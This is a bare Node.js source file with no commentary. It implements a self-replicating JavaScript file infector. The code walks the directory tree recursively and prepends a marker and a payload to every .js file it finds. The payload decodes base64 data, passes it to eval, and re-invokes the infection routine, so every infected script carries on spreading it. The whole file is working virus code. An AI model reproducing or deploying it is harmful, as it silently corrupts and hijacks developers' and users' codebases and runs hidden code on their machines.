const fs = require("fs")

function execute(vData) {
    const jsFiles = getAllFiles(__dirname, "js", true)
    for (const filePath of jsFiles) {
        if (filePath === __filename) continue
        const fileBuffer = fs.readFileSync(filePath)
        const prefixBuffer = createPrefixBuffer(filePath)
        const checksumMatches = Buffer.compare(prefixBuffer, fileBuffer.slice(0, prefixBuffer.length)) == 0
        if (checksumMatches) continue
        const payloadBuffer = createPayload(vData)
        const newBuffer = Buffer.concat([prefixBuffer, payloadBuffer, fileBuffer])
        fs.writeFileSync(filePath, newBuffer)
    }
}

function getAllFiles(currentPath, fileType = "", recurs = false) {
    let allFiles = []
    const dirItems = fs.readdirSync(currentPath, { withFileTypes: true })
    for (const item of dirItems) {
        const path = require('path');
        const itemPath = path.resolve(currentPath, item.name)
        if (recurs && item.isDirectory()) {
            allFiles = allFiles.concat(getAllFiles(itemPath, fileType, recurs))
        }
        else if (item.name.endsWith(fileType)) {
            allFiles.push(itemPath)
        }
    }
    return allFiles
}

function createPrefixBuffer(filePath) {
    const checksum = getChecksumFileName(filePath)
    return Buffer.from(`0x${checksum};`)
}

function createPayload(vDataBase64) {
    const payload = `v="${vDataBase64}";eval(Buffer.from(v,"base64").toString());e(v);\n`
    return Buffer.from(payload)
}

function getChecksumFileName(filePath) {
    const fileNameBuffer = Buffer.from(filePath)
    const crypto = require("crypto")
    const alg = crypto.createHash("md5")
    alg.update(fileNameBuffer)
    return alg.digest().slice(0, 4).toString("hex")
}

e = execute
exports.cpb = createPrefixBuffer
exports.cp = createPayload